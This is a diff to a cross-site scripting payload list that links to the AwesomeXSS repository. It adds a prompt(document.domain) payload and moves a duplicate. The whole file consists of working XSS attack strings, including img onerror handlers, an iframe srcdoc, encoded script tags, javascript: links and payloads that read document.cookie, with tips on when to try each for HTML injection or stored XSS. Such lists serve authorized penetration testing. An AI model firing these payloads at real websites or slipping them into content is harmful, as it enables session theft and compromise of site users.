@@ -1,9 +1,11 @@
 Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 
 <img src=1 onerror=alert("XSS")>
+<img/src/onerror=prompt(document.domain)>
 "><img src=1 onerror=alert("XSS")>
 "><img src=x onerror=alert(document.cookie)>
 <img src=x onerror=alert(document.cookie)>
+`<img/src/onerror=prompt(document.domain)>`
 <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
 "`'><script>\x3Bjavascript:alert(1)</script>
@@ -13,7 +15,6 @@ Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 </title><scRipt>alert(0x00C57D)</scRipt>
 <iMg src%3dN onerror%3dalert(0x0036A9)>
 <iMg src%3dN onerror%3dalert(0x000D98)>
-`<img/src/onerror=prompt(document.domain)>`
 <a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>     --> Do Try this if there is HTML Injection
 <a href="javascript:alert(document.domain)">XSS</a>                                --> Do Try this if there is HTML Injection
 <a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">XSS</a>             --> Do try this one for stored XSS
